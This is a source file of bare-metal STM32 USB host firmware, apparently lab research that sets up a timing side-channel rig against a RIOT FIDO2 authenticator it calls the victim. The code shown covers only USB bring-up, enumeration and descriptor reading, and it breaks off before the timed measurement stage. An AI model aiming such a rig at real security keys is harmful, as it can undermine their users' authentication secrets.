/* Bare-metal USB OTG FS *host* on a NUCLEO-F429ZI, driving RIOT's FIDO2 CTAP2
 * authenticator on an nRF52840-DK.
 *
 * WHY A HOST RIG AT ALL
 * ---------------------
 * Two reasons, and the second is the interesting one:
 *   1. Windows will not let a non-elevated process open a HID device on the FIDO
 *      usage page, so the PC cannot reach this victim at all
 *      (../fw_riot_fido2_hid/README.md).
 *   2. `bInterval` is a HOST SCHEDULING POLICY, not a property of the link.
 *      RIOT asks for 5 (sys/usb/usbus/hid/hid.c:127,138), which on a PC host
 *      quantises every reply onto a 5 ms grid -- 1.44 ms of noise against a
 *      0.54 us signal.  A host that does not implement periodic scheduling does
 *      not pay that.  The same trick measured IQR 444 ns against a PC host's
 *      42 400 ns on sboot (../../results/sboot/SBOOT_RESULTS.md).
 *
 * The OTG core is what makes it cheap: for a NON-PERIODIC channel it halts on
 * NAK and reports it in HCINT, which is a one-bit "done computing yet?" answer
 * at a cadence we choose.
 *
 * WIRING
 *   host CN13  <-- micro-B to micro-B -->  nRF52840-DK J3 (the nRF's own USB)
 *   DK J2 stays on the PC: that is SWD, and it is how VBUS arrival is verified.
 * The DK is claimed as `nrf52840` and this board as `f429_other`.
 *
 * STAGE A: power VBUS, enumerate, print the configuration descriptor -- done,
 * and it is how the endpoint numbers below were READ rather than assumed
 * (EP 0x01 OUT / 0x81 IN, mps 64, bInterval 5, and PG6 measured active-high).
 * STAGE B: the interrupt endpoints as non-periodic channels, CTAPHID framing,
 * and the timed getAssertion.
 *
 * Everything from the includes down to the CTAPHID section is fw_f4_usbhost's
 * bring-up unchanged; its comments record the bugs it cost and still apply.
 */
#include <stdint.h>
#include "stm32f4xx.h"

uint32_t SystemCoreClock = 72000000;

#define OTG        ((USB_OTG_GlobalTypeDef *)USB_OTG_FS_PERIPH_BASE)
#define OTGH       ((USB_OTG_HostTypeDef *)(USB_OTG_FS_PERIPH_BASE + USB_OTG_HOST_BASE))
#define HPRT       (*(volatile uint32_t *)(USB_OTG_FS_PERIPH_BASE + USB_OTG_HOST_PORT_BASE))
#define HC(i)      ((USB_OTG_HostChannelTypeDef *)(USB_OTG_FS_PERIPH_BASE + USB_OTG_HOST_CHANNEL_BASE + (i)*USB_OTG_HOST_CHANNEL_SIZE))
#define DFIFO(i)   ((volatile uint32_t *)(USB_OTG_FS_PERIPH_BASE + USB_OTG_FIFO_BASE + (i)*USB_OTG_FIFO_SIZE))

/* ---------- uart ----------
 * USART3 is on APB1, so its clock changes when the PLL comes up. Brought up
 * twice on purpose: once on HSI before the clock switch, so a hang in the PLL
 * path still prints something, and again afterwards at the new APB1 rate. A
 * silent board is expensive to debug over a serial cable. */
static void uart_init(uint32_t apb1_hz) {
    RCC->AHB1ENR |= RCC_AHB1ENR_GPIODEN;
    RCC->APB1ENR |= RCC_APB1ENR_USART3EN;
    GPIOD->MODER = (GPIOD->MODER & ~((3u<<16)|(3u<<18))) | (2u<<16) | (2u<<18);
    GPIOD->OSPEEDR |= (3u<<16) | (3u<<18);
    GPIOD->PUPDR = (GPIOD->PUPDR & ~((3u<<16)|(3u<<18))) | (1u<<18);
    GPIOD->AFR[1] = (GPIOD->AFR[1] & ~(0xFu|(0xFu<<4))) | 7u | (7u<<4);
    USART3->CR1 = 0;
    USART3->BRR = (apb1_hz + 115200u / 2u) / 115200u;
    USART3->CR1 = USART_CR1_UE | USART_CR1_TE | USART_CR1_RE;
}

/* ---------- clock ----------
 * HSI 16 MHz -> PLL M=8 N=72 P=2 Q=3 -> SYSCLK 72 MHz, USB 48 MHz.
 * The bus prescalers MUST be set before the switch: APB1 tops out at 42 MHz on
 * this part, so leaving PPRE1 at /1 would run it at 72 MHz -- out of spec, and
 * it silently doubles USART3's clock so the baud rate comes out half. */
static void clock_init(void) {
    RCC->CR |= RCC_CR_HSION;
    while (!(RCC->CR & RCC_CR_HSIRDY)) {}
    FLASH->ACR = 2u | FLASH_ACR_PRFTEN | FLASH_ACR_ICEN | FLASH_ACR_DCEN;
    /* AHB /1 = 72 MHz, APB1 /2 = 36 MHz (<=42), APB2 /1 = 72 MHz (<=84) */
    RCC->CFGR = (RCC->CFGR & ~(RCC_CFGR_HPRE | RCC_CFGR_PPRE1 | RCC_CFGR_PPRE2))
              | RCC_CFGR_HPRE_DIV1 | RCC_CFGR_PPRE1_DIV2 | RCC_CFGR_PPRE2_DIV1;
    /* HSI/8 = 2 MHz; x72 = 144 MHz VCO; /2 = 72 MHz SYSCLK; /3 = 48 MHz USB.
     * PLLSRC (bit 22) left 0 = HSI. */
    RCC->PLLCFGR = (8u << RCC_PLLCFGR_PLLM_Pos) | (72u << RCC_PLLCFGR_PLLN_Pos)
                 | (0u << RCC_PLLCFGR_PLLP_Pos) | (3u << RCC_PLLCFGR_PLLQ_Pos);
    RCC->CR |= RCC_CR_PLLON;
    uint32_t guard = 2000000;
    while (!(RCC->CR & RCC_CR_PLLRDY) && --guard) {}
    if (!guard) return;                    /* caller still has the HSI console */
    RCC->CFGR = (RCC->CFGR & ~RCC_CFGR_SW) | RCC_CFGR_SW_PLL;
    guard = 2000000;
    while (((RCC->CFGR & RCC_CFGR_SWS) != RCC_CFGR_SWS_PLL) && --guard) {}
}
static void uputc(char c){ while(!(USART3->SR & USART_SR_TXE)){} USART3->DR=(uint8_t)c; }
static void uputs(const char*s){ while(*s) uputc(*s++); }
static void nl(void){ uputc('\r'); uputc('\n'); }
static const char HEX[]="0123456789abcdef";
static void puthex32(uint32_t v){ for(int i=28;i>=0;i-=4) uputc(HEX[(v>>i)&0xf]); }
static void putdec(uint32_t v){ char b[12]; int n=0; if(!v){uputc('0');return;} while(v){b[n++]=(char)('0'+v%10);v/=10;} while(n--) uputc(b[n]); }
static int  ugetc(void){ while(!(USART3->SR & USART_SR_RXNE)){} return (int)(USART3->DR & 0xFF); }
static int  getline_(char*b,int n){ int i=0; for(;;){ int c=ugetc(); if(c=='\n'||c=='\r'){ if(!i) continue; break;} if(i<n-1) b[i++]=(char)c;} b[i]=0; return i; }

/* ---------- free-running microsecond timer (TIM2, 32-bit, at SYSCLK) ------
 * This is what will place the status-stage IN token later; for now it is the
 * delay source and the proof the timebase is sane. */
static void tim2_init(void) {
    RCC->APB1ENR |= RCC_APB1ENR_TIM2EN;
    TIM2->PSC = 0;                      /* full 72 MHz -> 13.9 ns ticks */
    TIM2->ARR = 0xFFFFFFFFu;
    TIM2->EGR = TIM_EGR_UG;
    TIM2->CR1 = TIM_CR1_CEN;
}
static inline uint32_t now(void){ return TIM2->CNT; }
static void delay_us(uint32_t us){ uint32_t t0=now(), n=us*72u; while((now()-t0) < n) {} }

/* ---------- OTG FS host ---------- */
static void otg_gpio(void) {
    RCC->AHB1ENR |= RCC_AHB1ENR_GPIOAEN;
    /* PA11 = DM, PA12 = DP, AF10 */
    GPIOA->MODER   = (GPIOA->MODER   & ~((3u<<22)|(3u<<24))) | (2u<<22) | (2u<<24);
    GPIOA->OSPEEDR |= (3u<<22) | (3u<<24);
    GPIOA->PUPDR   &= ~((3u<<22)|(3u<<24));
    GPIOA->AFR[1]  = (GPIOA->AFR[1] & ~((0xFu<<12)|(0xFu<<16))) | (10u<<12) | (10u<<16);
}

static int otg_host_init(void) {
    RCC->AHB2ENR |= RCC_AHB2ENR_OTGFSEN;

    /* core soft reset */
    uint32_t guard = 200000;
    while (!(OTG->GRSTCTL & USB_OTG_GRSTCTL_AHBIDL) && --guard) {}
    if (!guard) return 1;
    OTG->GRSTCTL |= USB_OTG_GRSTCTL_CSRST;
    guard = 200000;
    while ((OTG->GRSTCTL & USB_OTG_GRSTCTL_CSRST) && --guard) {}
    if (!guard) return 2;
    delay_us(5000);

    /* transceiver on, VBUS sensing off (target is self-powered) */
    OTG->GCCFG = USB_OTG_GCCFG_PWRDWN | USB_OTG_GCCFG_NOVBUSSENS;
    delay_us(5000);

    /* force host mode regardless of the ID pin, then wait for the mode flag */
    OTG->GUSBCFG |= USB_OTG_GUSBCFG_FHMOD;
    OTG->GUSBCFG = (OTG->GUSBCFG & ~USB_OTG_GUSBCFG_TRDT) | (9u << USB_OTG_GUSBCFG_TRDT_Pos);
    delay_us(50000);                              /* datasheet: >=25 ms to settle */
    guard = 200000;
    while (!(OTG->GINTSTS & USB_OTG_GINTSTS_CMOD) && --guard) {}   /* CMOD=1 -> host */
    if (!guard) return 3;

    /* 48 MHz full-speed PHY clock */
    OTGH->HCFG = (OTGH->HCFG & ~USB_OTG_HCFG_FSLSPCS) | 1u;
    OTGH->HCFG |= USB_OTG_HCFG_FSLSS;

    /* FIFOs: 128 words RX, 96 non-periodic TX, 96 periodic TX (320 total <= 320) */
    OTG->GRXFSIZ   = 128;
    OTG->DIEPTXF0_HNPTXFSIZ = (96u << 16) | 128u;
    OTG->HPTXFSIZ  = (96u << 16) | (128u + 96u);
    OTG->GRSTCTL |= USB_OTG_GRSTCTL_TXFFLSH | (0x10u << USB_OTG_GRSTCTL_TXFNUM_Pos);
    guard = 200000; while ((OTG->GRSTCTL & USB_OTG_GRSTCTL_TXFFLSH) && --guard) {}
    OTG->GRSTCTL |= USB_OTG_GRSTCTL_RXFFLSH;
    guard = 200000; while ((OTG->GRSTCTL & USB_OTG_GRSTCTL_RXFFLSH) && --guard) {}

    /* drive port power */
    uint32_t p = HPRT & ~(USB_OTG_HPRT_PENA | USB_OTG_HPRT_PCDET |
                          USB_OTG_HPRT_PENCHNG | USB_OTG_HPRT_POCCHNG);
    HPRT = p | USB_OTG_HPRT_PPWR;
    delay_us(200000);
    return 0;
}

static const char *speed_name(uint32_t hprt) {
    switch ((hprt & USB_OTG_HPRT_PSPD) >> USB_OTG_HPRT_PSPD_Pos) {
    case 1:  return "full-speed";
    case 2:  return "low-speed";
    default: return "(reserved)";
    }
}

/* Reset the port: >=10 ms asserted, then let it settle. */
static void port_reset(void) {
    uint32_t p = HPRT & ~(USB_OTG_HPRT_PENA | USB_OTG_HPRT_PCDET |
                          USB_OTG_HPRT_PENCHNG | USB_OTG_HPRT_POCCHNG);
    HPRT = p | USB_OTG_HPRT_PRST;
    delay_us(15000);
    p = HPRT & ~(USB_OTG_HPRT_PENA | USB_OTG_HPRT_PCDET |
                 USB_OTG_HPRT_PENCHNG | USB_OTG_HPRT_POCCHNG | USB_OTG_HPRT_PRST);
    HPRT = p;
    delay_us(30000);
}

static void report_port(void) {
    uint32_t h = HPRT;
    uputs("  HPRT=0x"); puthex32(h);
    uputs("  PCSTS="); uputc((h & USB_OTG_HPRT_PCSTS) ? '1' : '0');
    uputs(" PENA=");   uputc((h & USB_OTG_HPRT_PENA)  ? '1' : '0');
    uputs(" PSPD=");   uputs(speed_name(h));
    uputs("  GINTSTS=0x"); puthex32(OTG->GINTSTS);
    nl();
}


/* ================= stage 2: control transfers =========================
 * Slave mode, no DMA, no interrupts -- everything polled, because the point of
 * this host is that we decide exactly when a token goes out. The OTG core
 * halts a non-periodic channel on NAK and reports it in HCINT, which is the
 * one-bit comparator the attack needs.
 *
 * Channel 0 is used for everything; direction and PID are reprogrammed per
 * transaction. That is legal for control transfers and keeps the state small.
 */

#define PID_DATA0 0u
#define PID_DATA2 1u
#define PID_DATA1 2u
#define PID_SETUP 3u          /* == MDATA for OUT */

#define XR_OK      0
#define XR_NAK     1
#define XR_STALL   2
#define XR_ERR     3
#define XR_TIMEOUT 4

static uint32_t g_hcint_last;      /* HCINT as it was when hc_txn decided */
/* hc_halt()'s wait for CHENA to clear costs ~25 ms when it runs to its guard, and
 * on a NAKed interrupt-endpoint poll it always does.  The control path keeps the
 * long guard (it is what made enumeration reliable); the HID poll path sets this
 * and gets a bounded one.  Without it every reply time was a constant 25-50 ms of
 * our own spinning, whatever the authenticator did. */
static uint32_t g_fast_halt;
/* Iterations hc_halt() spends waiting for CHENA on the POLL path.  It was hard-coded
 * at 3 000, and 3 000 volatile HCCHAR reads over the AHB at 72 MHz is ~375 us -- which
 * is the 389 us gap that set this rig's whole measurement granularity.  The `D`
 * command's in-guard was wired to hc_halt_guarded() (hc_prep_bulk's halt) and never
 * reached here, which is why shortening it from 200 to 1 moved nothing.
 *
 * The three fast polls between gaps are the CHH exit in hc_txn(), which returns
 * without halting at all; only the NAK exit pays this loop. */
static uint32_t g_halt_guard = 3000u;
static uint8_t  g_addr = 0;        /* current device address */
static uint16_t g_mps  = 8;        /* EP0 max packet size; 8 until we learn better */

/* A channel left enabled cannot be reused: the next CHENA write just hangs and
 * the transaction times out. The core requires an explicit halt (CHDIS|CHENA)
 * and a wait for CHENA to clear. Skipping this works for one-off transfers by
 * luck and fails under repetition, which is exactly the shape of the bug that
 * showed up as 'err 4' only inside the timing loop. */
static void hc_halt(int ch) {
    uint32_t c = HC(ch)->HCCHAR;
    if (c & USB_OTG_HCCHAR_CHENA) {
        HC(ch)->HCCHAR = c | USB_OTG_HCCHAR_CHDIS | USB_OTG_HCCHAR_CHENA;
        uint32_t g = g_fast_halt ? g_halt_guard : 200000u;
        while ((HC(ch)->HCCHAR & USB_OTG_HCCHAR_CHENA) && --g) {}
    }
    HC(ch)->HCINT = 0xFFFFFFFFu;
}

static void hc_prep(int ch, uint8_t dev_addr, uint8_t ep, int is_in, uint16_t mps) {
    hc_halt(ch);
    HC(ch)->HCINT = 0xFFFFFFFFu;
    HC(ch)->HCINTMSK = 0;
    HC(ch)->HCCHAR = ((uint32_t)mps << USB_OTG_HCCHAR_MPSIZ_Pos)
                   | (((uint32_t)ep & 0xFu) << USB_OTG_HCCHAR_EPNUM_Pos)
                   | (is_in ? USB_OTG_HCCHAR_EPDIR : 0u)
                   | (0u << USB_OTG_HCCHAR_EPTYP_Pos)          /* control */
                   | (1u << USB_OTG_HCCHAR_MC_Pos)
                   | (((uint32_t)dev_addr & 0x7Fu) << USB_OTG_HCCHAR_DAD_Pos);
}

static void hc_enable(int ch) {
    uint32_t c = HC(ch)->HCCHAR;
    c &= ~USB_OTG_HCCHAR_CHDIS;
    c |= USB_OTG_HCCHAR_CHENA;
    if (OTGH->HFNUM & 1u) c &= ~USB_OTG_HCCHAR_ODDFRM;
    else                  c |=  USB_OTG_HCCHAR_ODDFRM;
    HC(ch)->HCCHAR = c;
}

/* Drain one packet out of the shared RX FIFO into `buf`. */
static uint32_t rx_drain(uint8_t *buf, uint32_t cap, uint32_t got) {
    uint32_t st = OTG->GRXSTSP;
    uint32_t bcnt = (st & USB_OTG_GRXSTSP_BCNT) >> USB_OTG_GRXSTSP_BCNT_Pos;
    uint32_t pkt  = (st & USB_OTG_GRXSTSP_PKTSTS) >> USB_OTG_GRXSTSP_PKTSTS_Pos;
    if (pkt == 2u && bcnt) {                         /* IN data packet received */
        for (uint32_t i = 0; i < bcnt; i += 4) {
            uint32_t w = *DFIFO(0);
            for (uint32_t b = 0; b < 4 && (i + b) < bcnt; b++)
                if (buf && (got + i + b) < cap) buf[got + i + b] = (uint8_t)(w >> (8 * b));
        }
        return bcnt;
    }
    return 0;
}

/* One transaction. Returns XR_*; *out_len gets bytes actually moved. */
static int hc_txn(int ch, int is_in, uint32_t dpid, uint8_t *buf,
                  uint32_t len, uint32_t *out_len, uint32_t timeout_us) {
    uint32_t mps  = g_mps ? g_mps : 8u;
    uint32_t pkts = len ? ((len + mps - 1u) / mps) : 1u;
    uint32_t got  = 0;

    HC(ch)->HCTSIZ = (len & USB_OTG_HCTSIZ_XFRSIZ)
                   | ((pkts << USB_OTG_HCTSIZ_PKTCNT_Pos) & USB_OTG_HCTSIZ_PKTCNT)
                   | (dpid << USB_OTG_HCTSIZ_DPID_Pos);
    hc_enable(ch);

    if (!is_in && len) {                              /* push OUT payload */
        for (uint32_t i = 0; i < len; i += 4) {
            uint32_t w = 0;
            for (uint32_t b = 0; b < 4 && (i + b) < len; b++)
                w |= (uint32_t)buf[i + b] << (8 * b);
            *DFIFO(ch) = w;
        }
    }

    uint32_t t0 = now(), lim = timeout_us * 72u;
    for (;;) {
        if (OTG->GINTSTS & USB_OTG_GINTSTS_RXFLVL) {
            OTG->GINTMSK &= ~USB_OTG_GINTMSK_RXFLVLM;
            got += rx_drain(buf, len, got);
            OTG->GINTMSK |= USB_OTG_GINTMSK_RXFLVLM;
        }
        uint32_t s = HC(ch)->HCINT;
        g_hcint_last = s;      /* added for the CTAPHID host: hc_halt() below
                                * clears HCINT, so without this every diagnostic
                                * dump reads 0 and says nothing. */
        /* XFRC FIRST. The core can set XFRC and NAK together -- a transaction
         * that NAKed once and then completed leaves both bits up (measured:
         * HCINT=0x21 on a SETUP that demonstrably went out and decremented
         * PKTCNT). Testing NAK first reads a successful transfer as a failure,
         * which is what stalled enumeration here for several rounds. */
        if (s & USB_OTG_HCINT_XFRC)  { hc_halt(ch); if (out_len) *out_len = got; return XR_OK; }
        if (s & USB_OTG_HCINT_STALL) { hc_halt(ch); if (out_len) *out_len = got; return XR_STALL; }
        if (s & USB_OTG_HCINT_NAK)   { hc_halt(ch); if (out_len) *out_len = got; return XR_NAK; }
        if (s & (USB_OTG_HCINT_TXERR | USB_OTG_HCINT_BBERR | USB_OTG_HCINT_DTERR | USB_OTG_HCINT_FRMOR)) {
            hc_halt(ch); if (out_len) *out_len = got; return XR_ERR;
        }
        /* CHH last, and it MUST be here: the core can halt a channel with only
         * CHH set -- no XFRC, no NAK, no error. Without this the poll loop spins
         * to the timeout on a perfectly ordinary halt, which is what stalled the
         * IN data stage. Treat a bare halt as retryable. */
        if (s & USB_OTG_HCINT_CHH) {
            HC(ch)->HCINT = 0xFFFFFFFFu;
            if (out_len) *out_len = got;
            return XR_NAK;
        }
        if ((now() - t0) > lim)      { hc_halt(ch); if (out_len) *out_len = got; return XR_TIMEOUT; }
    }
}

/* Retry a transaction while the device NAKs. Control transfers are allowed to
 * NAK indefinitely; a cap keeps a dead device from hanging us. */
static int hc_txn_retry(int ch, int is_in, uint32_t dpid, uint8_t *buf,
                        uint32_t len, uint32_t *out_len, uint32_t tries) {
    int r = XR_NAK;
    while (tries--) {
        r = hc_txn(ch, is_in, dpid, buf, len, out_len, 20000u);
        if (r != XR_NAK) return r;
    }
    return r;
}

/* A full control transfer: SETUP, optional DATA, STATUS. */
static int ctrl_xfer(uint8_t bmRequestType, uint8_t bRequest, uint16_t wValue,
                     uint16_t wIndex, uint8_t *data, uint16_t wLength,
                     uint32_t *out_len) {
    g_fast_halt = 0u;          /* enumeration keeps the long, proven guard */
    uint8_t setup[8] = { bmRequestType, bRequest,
                         (uint8_t)wValue, (uint8_t)(wValue >> 8),
                         (uint8_t)wIndex, (uint8_t)(wIndex >> 8),
                         (uint8_t)wLength, (uint8_t)(wLength >> 8) };
    int in = (bmRequestType & 0x80u) != 0;
    uint32_t moved = 0;

    hc_prep(0, g_addr, 0, 0, g_mps);
    int r = hc_txn_retry(0, 0, PID_SETUP, setup, 8, 0, 8);
    if (r != XR_OK) return r;

    /* Data stage, ONE max-packet transaction at a time, toggling DATA0/DATA1
     * ourselves. Letting the core run a multi-packet transfer is tidier but it
     * hides exactly what the attack needs to control: a single IN token whose
     * answer is NAK or data. So the packet loop is the architecture, not a
     * workaround for the multi-packet path not completing. */
    if (wLength) {
        uint32_t done = 0, pid = PID_DATA1;
        while (done < wLength) {
            uint32_t chunk = wLength - done;
            if (chunk > g_mps) chunk = g_mps;
            uint32_t got = 0;
            hc_prep(0, g_addr, 0, in, g_mps);
            r = hc_txn_retry(0, in, pid, data ? data + done : 0, chunk, &got, 200);
            if (r != XR_OK) { moved = done; if (out_len) *out_len = moved; return r; }
            done += in ? got : chunk;
            pid = (pid == PID_DATA1) ? PID_DATA0 : PID_DATA1;
            if (in && got < g_mps) break;           /* short packet ends the stage */
        }
        moved = done;
    }

    hc_prep(0, g_addr, 0, !in, g_mps);          /* status: opposite direction */
    r = hc_txn_retry(0, !in, PID_DATA1, 0, 0, 0, 200);
    if (out_len) *out_len = moved;
    return r;
}

static const char *xr_name(int r) {
    switch (r) { case XR_OK: return "OK"; case XR_NAK: return "NAK";
                 case XR_STALL: return "STALL"; case XR_ERR: return "ERR";
                 default: return "TIMEOUT"; }
}

static void puthexb(uint8_t b){ uputc(HEX[b>>4]); uputc(HEX[b&0xf]); }

static void vbus_set(int high);     /* defined with the rest of the VBUS control */

/* Drop port power, wait, bring it back. From the device's side this is
 * indistinguishable from being unplugged, so it clears a peripheral that is
 * wedged in an addressed/configured state -- which is exactly what happens when
 * the host reboots mid-session. An unattended rig needs this anyway. */
static void port_power_cycle(void) {
    uint32_t p = HPRT & ~(USB_OTG_HPRT_PENA | USB_OTG_HPRT_PCDET |
                          USB_OTG_HPRT_PENCHNG | USB_OTG_HPRT_POCCHNG);
    HPRT = p & ~USB_OTG_HPRT_PPWR;
    /* NOT dropping PG6 here, deliberately.  HPRT.PPWR reaches nothing on this
     * board -- 5 V is switched by PG6 -- so this is a reset, not a power cycle.
     * That is enough: a USB bus reset returns the device to the default state at
     * address 0, which is what enumeration needs.  Cutting PG6 instead makes the
     * nRF tear down and rebuild its whole USB stack, and enumeration then has to
     * wait for that; measured, it NAKs if you do not. */
    delay_us(300000);
    p = HPRT & ~(USB_OTG_HPRT_PENA | USB_OTG_HPRT_PCDET |
                 USB_OTG_HPRT_PENCHNG | USB_OTG_HPRT_POCCHNG);
    HPRT = p | USB_OTG_HPRT_PPWR;
    delay_us(300000);
    /* wait for the device to signal attach again */
    uint32_t guard = 500;
    while (!(HPRT & USB_OTG_HPRT_PCSTS) && --guard) delay_us(1000);
}

static void fifo_flush(void) {
    OTG->GRSTCTL |= USB_OTG_GRSTCTL_TXFFLSH | (0x10u << USB_OTG_GRSTCTL_TXFNUM_Pos);
    uint32_t g = 200000; while ((OTG->GRSTCTL & USB_OTG_GRSTCTL_TXFFLSH) && --g) {}
    OTG->GRSTCTL |= USB_OTG_GRSTCTL_RXFFLSH;
    g = 200000; while ((OTG->GRSTCTL & USB_OTG_GRSTCTL_RXFFLSH) && --g) {}
    for (int i = 0; i < 8; i++) HC(i)->HCINT = 0xFFFFFFFFu;
}

/* Enumerate: reset, read EP0 size, set address, read the full descriptor. */
static int enumerate(void) {
    uint8_t buf[64];
    uint32_t n = 0;

    /* sboot arms dfu_reset on usbd_evt_reset once SET_CONFIGURATION lands
     * (bootloader.c:295), and dfu_reset calls System_Reset(). So any bus reset
     * after we have configured the device REBOOTS THE TARGET, which then re-runs
     * its ~2 MB CRC scan before answering again. Budget seconds, not
     * milliseconds -- and enumerate ONCE per campaign, never mid-run. */
    /* Back to the sequence that demonstrably worked. Two theories died here and
     * are recorded so they are not retried:
     *   - "the target wedges after SET_CONFIGURATION arms dfu_reset": false.
     *     Resetting the target by reflashing it changed nothing.
     *   - "give the target seconds to reboot after a bus reset": actively
     *     harmful. A device suspends after ~3 ms of bus idle, so a multi-second
     *     gap between port reset and the first SETUP is far outside spec. The
     *     200 ms version works; the 2.5 s version does not.
     * sboot DOES reboot itself on a bus reset once configured (dfu_reset via
     * bootloader.c:295) -- that is real, and the reason to enumerate once per
     * campaign rather than mid-run. It is just not what broke this. */
    g_addr = 0; g_mps = 8;
    port_power_cycle();
    fifo_flush();
    port_reset();
    delay_us(200000);

    int r0 = XR_TIMEOUT;
    for (int a = 0; a < 3 && r0 != XR_OK; a++) {
        if (a) { port_reset(); delay_us(200000); fifo_flush(); }
        r0 = ctrl_xfer(0x80, 6, 0x0100, 0, buf, 8, &n);
    }
    uputs("  GET_DESC(8) -> "); uputs(xr_name(r0));
    uputs(" n="); putdec(n); nl();
    if (r0 != XR_OK || n < 8) return r0 ? r0 : XR_ERR;

    int r = r0;
    g_mps = buf[7] ? buf[7] : 8;
    uputs("  bMaxPacketSize0="); putdec(g_mps); nl();

    port_reset();                                           /* per spec, reset again */
    delay_us(100000);
    r = ctrl_xfer(0x00, 5, 1, 0, 0, 0, 0);                  /* SET_ADDRESS(1) */
    uputs("  SET_ADDRESS(1) -> "); uputs(xr_name(r)); nl();
    if (r != XR_OK) return r;
    g_addr = 1;
    delay_us(10000);

    r = ctrl_xfer(0x80, 6, 0x0100, 0, buf, 18, &n);         /* full device descriptor */
    uputs("  GET_DESC(18) -> "); uputs(xr_name(r));
    uputs(" n="); putdec(n); nl();
    if (r != XR_OK || n < 18) return r ? r : XR_ERR;

    uputs("  descriptor: ");
    for (uint32_t i = 0; i < n; i++) puthexb(buf[i]);
    nl();
    uputs("  VID="); puthexb(buf[9]); puthexb(buf[8]);
    uputs(" PID=");  puthexb(buf[11]); puthexb(buf[10]);
    uputs(" class="); puthexb(buf[4]);
    uputs(" numcfg="); putdec(buf[17]);
    nl();

    r = ctrl_xfer(0x00, 9, 1, 0, 0, 0, 0);                  /* SET_CONFIGURATION(1) */
    uputs("  SET_CONFIG(1) -> "); uputs(xr_name(r)); nl();
    return r;
}
/* ======================= CTAPHID host, stage A ==========================
 *
 * Everything above this line is fw_f4_usbhost's proven OTG bring-up, verbatim
 * (see that rig for the four bugs it cost).  Everything below is new, and stage
 * A stops at the point where guessing would start: power VBUS, enumerate, and
 * print the configuration descriptor so the endpoint numbers for stage B are
 * READ rather than assumed.
 *
 * WHAT IS DIFFERENT FROM THE SBOOT HOST
 * ------------------------------------
 * VBUS.  sboot's target sets NOVBUSSENS and is self-powered, so that host never
 * had to supply 5 V.  The nRF52840 will not pull up D+ until it sees VBUS
 * (POWER->USBREGSTATUS.VBUSDETECT), so this host MUST power the port.  On a
 * NUCLEO-144 the OTG_FS connector's 5 V comes from an on-board power switch
 * driven by a plain GPIO, not by the OTG core's PPWR signal -- PG6 is the
 * enable and PG7 the overcurrent flag on this board family.
 *
 * The switch's POLARITY is not documented in anything on this bench, so it is
 * not guessed: `P 1` and `P 2` drive PG6 high and low, and the answer is read
 * off the DEVICE with
 *     python -m pyocd commander -u 1050219420 -t nrf52840 --connect attach \
 *            -c "read32 0x40000438"
 * where bit 0 is VBUSDETECT.  That is a closed loop against the thing we
 * actually care about, rather than a reading of a schematic we do not have.
 */

#define VBUS_PIN   6u          /* PG6  -- USB_PowerSwitchOn on NUCLEO-144 */
#define OC_PIN     7u          /* PG7  -- USB_OverCurrent, active low */

static void vbus_gpio_init(void) {
    RCC->AHB1ENR |= RCC_AHB1ENR_GPIOGEN;
    /* PG6 push-pull output, PG7 input with pull-up */
    GPIOG->MODER = (GPIOG->MODER & ~((3u << (VBUS_PIN*2)) | (3u << (OC_PIN*2))))
                 | (1u << (VBUS_PIN*2));
    GPIOG->OTYPER &= ~(1u << VBUS_PIN);
    GPIOG->PUPDR = (GPIOG->PUPDR & ~(3u << (OC_PIN*2))) | (1u << (OC_PIN*2));
    GPIOG->BSRR = 1u << (VBUS_PIN + 16);        /* start with the switch off */
}
static void vbus_set(int high) {
    GPIOG->BSRR = high ? (1u << VBUS_PIN) : (1u << (VBUS_PIN + 16));
}
static int oc_fault(void) { return !(GPIOG->IDR & (1u << OC_PIN)); }

static void report_vbus(void) {
    uputs("  PG6="); uputc((GPIOG->ODR & (1u << VBUS_PIN)) ? '1' : '0');
    uputs(" PG7(oc,low=fault)="); uputc((GPIOG->IDR & (1u << OC_PIN)) ? '1' : '0');
    uputs(oc_fault() ? "  OVERCURRENT" : "");
    nl();
}

/* ---- configuration descriptor -------------------------------------------
 * Read it in two steps (9 bytes for wTotalLength, then the whole thing) and
 * print every endpoint descriptor found.  Stage B needs the IN and OUT
 * endpoint addresses, their max packet size and their bInterval; this prints
 * them so none of the three is a constant in the source that nobody checked.
 */
static uint8_t g_cfg[128];
static uint8_t g_ep_in, g_ep_out;
static uint16_t g_ep_mps;
static uint8_t g_ep_ival;

static int read_config_desc(void) {
    uint32_t n = 0;
    int r = ctrl_xfer(0x80, 6, 0x0200, 0, g_cfg, 9, &n);
    uputs("  GET_DESC(CONFIG,9) -> "); uputs(xr_name(r));
    uputs(" n="); putdec(n); nl();
    if (r != XR_OK || n < 9) return r ? r : XR_ERR;

    uint16_t total = (uint16_t)(g_cfg[2] | (g_cfg[3] << 8));
    if (total > sizeof g_cfg) total = sizeof g_cfg;
    r = ctrl_xfer(0x80, 6, 0x0200, 0, g_cfg, total, &n);
    uputs("  GET_DESC(CONFIG,"); putdec(total); uputs(") -> "); uputs(xr_name(r));
    uputs(" n="); putdec(n); nl();
    if (r != XR_OK || n < 9) return r ? r : XR_ERR;

    uputs("  cfg: ");
    for (uint32_t i = 0; i < n; i++) puthexb(g_cfg[i]);
    nl();

    g_ep_in = g_ep_out = 0; g_ep_mps = 0; g_ep_ival = 0;
    for (uint32_t i = 0; i + 1 < n; ) {
        uint8_t len = g_cfg[i], typ = g_cfg[i+1];
        if (!len) break;
        if (typ == 4 && i + 8 < n) {                      /* INTERFACE */
            uputs("  iface "); putdec(g_cfg[i+2]);
            uputs(" class=");  puthexb(g_cfg[i+5]);
            uputs(" sub=");    puthexb(g_cfg[i+6]);
            uputs(" proto=");  puthexb(g_cfg[i+7]);
            uputs(" neps=");   putdec(g_cfg[i+4]); nl();
        } else if (typ == 5 && i + 6 < n) {               /* ENDPOINT */
            uint8_t  addr = g_cfg[i+2], attr = g_cfg[i+3], ival = g_cfg[i+6];
            uint16_t mps  = (uint16_t)(g_cfg[i+4] | (g_cfg[i+5] << 8));
            uputs("  ep 0x"); puthexb(addr);
            uputs(" attr=");  puthexb(attr);
            uputs(" mps=");   putdec(mps);
            uputs(" bInterval="); putdec(ival);
            uputs((attr & 3u) == 3u ? "  (interrupt)" : "");
            nl();
            if (addr & 0x80u) g_ep_in = addr & 0x0Fu; else g_ep_out = addr & 0x0Fu;
            if (mps) g_ep_mps = mps;
            if (ival) g_ep_ival = ival;
        }
        i += len;
    }
    uputs("  -> EP OUT=0x"); puthexb(g_ep_out);
    uputs(" IN=0x"); puthexb((uint8_t)(0x80u | g_ep_in));
    uputs(" mps="); putdec(g_ep_mps);
    uputs(" bInterval="); putdec(g_ep_ival);
